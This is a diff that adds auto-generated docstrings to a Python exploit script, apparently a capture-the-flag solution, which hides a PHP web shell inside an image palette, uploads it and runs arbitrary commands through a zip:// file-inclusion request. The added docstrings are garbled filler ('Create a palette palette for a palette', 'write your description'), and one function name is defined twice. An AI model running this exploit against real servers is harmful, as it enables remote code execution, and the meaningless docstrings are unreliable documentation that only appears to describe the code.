@@ -26,6 +26,11 @@ def make_embedded(zipdata, prefixlen, suffixlen):
 shell = open('shell.php', 'r').read()
 
 def create_exploit_palette():
+    """
+    Create a palette palette for a palette.
+
+    Args:
+    """
     from cStringIO import StringIO
     from zipfile import ZipFile
 
@@ -45,6 +50,11 @@ def create_exploit_palette():
     return ['#%02x%02x%02x' % tuple(map(ord, palette[i:i+3])) for i in xrange(0, len(palette), 3)]
 
 def create_exploit_palette():
+    """
+    Create a palette palette.
+
+    Args:
+    """
     data = shell
     padding = 3 - len(data) % 3
 
@@ -62,6 +72,12 @@ data = {'im': [0] * 1024, 'pal': create_exploit_palette()}
 r = s.post(URL + '?op=save', data={'imagekey': imagekey, 'savedata': json.dumps(data)})
 
 def execute_cmd(cmd):
+    """
+    Execute a command
+
+    Args:
+        cmd: (str): write your description
+    """
     r = s.get(URL, params={'op': 'zip://uploads/%s.png#shell' % imagekey, 'e': cmd})
     return r.text
 
